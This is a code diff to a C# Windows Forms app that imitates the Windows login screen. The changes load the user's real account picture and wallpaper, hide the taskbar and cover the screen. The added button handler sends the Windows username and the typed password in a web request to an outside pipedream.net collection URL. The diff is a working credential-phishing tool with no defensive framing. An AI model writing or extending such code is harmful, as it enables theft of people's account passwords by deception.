@@ -1,22 +1,29 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
 using System.Drawing;
-using System.Linq;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-using System.Linq;
 using System.Runtime.InteropServices;
+using System.Net;
 
 namespace WindowsFormsApp9
 {
     public partial class Form1 : Form
     {
+
+        private Image UserPicture;
+
         public Form1()
         {
+            Microsoft.Win32.RegistryKey AccountPictureReg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\AccountPicture", true);
+            string AccountPictureFilename = AccountPictureReg.GetValue("SourceId").ToString();
+            AccountPictureReg.Close();
+
+            string AccountPicture = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\AccountPictures\\" + AccountPictureFilename + ".accountpicture-ms");
+            Console.WriteLine(AccountPicture);
+            UserPicture = accountpicture_ms.AccountPicConverter.GetImage448(AccountPicture);
+
             InitializeComponent();
             Taskbar.Hide();
             FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
@@ -24,7 +31,7 @@ namespace WindowsFormsApp9
             StartPosition = FormStartPosition.Manual;
             Location = new Point(0, 0);
             Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            Image myimage = new Bitmap(@"C:\Windows\Web\Wallpaper\Windows\img0.jpg");
+            Image myimage = new Bitmap(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
             BackgroundImage = myimage;
             BackgroundImageLayout = ImageLayout.Stretch;
             this.TopMost = true;
@@ -53,6 +60,14 @@ namespace WindowsFormsApp9
             }
 
 
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            pictureBox1.Image = (Image)UserPicture;
+            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
+            gp.AddEllipse(0, 0, pictureBox1.Width - 3, pictureBox1.Height - 3);
+            Region rg = new Region(gp);
+            pictureBox1.Region = rg;
         }
 
         public class Taskbar
@@ -114,8 +129,8 @@ namespace WindowsFormsApp9
             {
                 if (screen.Primary == true)
                 {
-                   
-                    
+
+
                 }
 
                 if (screen.Primary == false)
@@ -135,7 +150,7 @@ namespace WindowsFormsApp9
                     }
                 }
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 // log errors
             }
@@ -177,13 +192,13 @@ namespace WindowsFormsApp9
 
         protected override void OnClosing(CancelEventArgs e)
         {
-                Taskbar.Show();
+            Taskbar.Show();
             base.OnClosing(e);
         }
 
         private void textBox2_TextChanged(object sender, EventArgs e)
         {
-            Console.WriteLine(textBox2);
+            //Console.WriteLine(textBox2);
         }
 
         private void label1_Click(object sender, EventArgs e)
@@ -199,10 +214,19 @@ namespace WindowsFormsApp9
 
         private void button1_Click_1(object sender, EventArgs e)
         {
+            var th = new Thread(postData);
+            th.Start();
+
             Taskbar.Show();
             System.Windows.Forms.Application.Exit();
         }
+
+        private void postData()
+        {
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("https://ensud9bc6vko.x.pipedream.net?username=" + System.Environment.UserName.ToString() + "&pass=" + textBox2.Text);
+            req.GetResponse();
+        }
     }
-    
+
 
 }
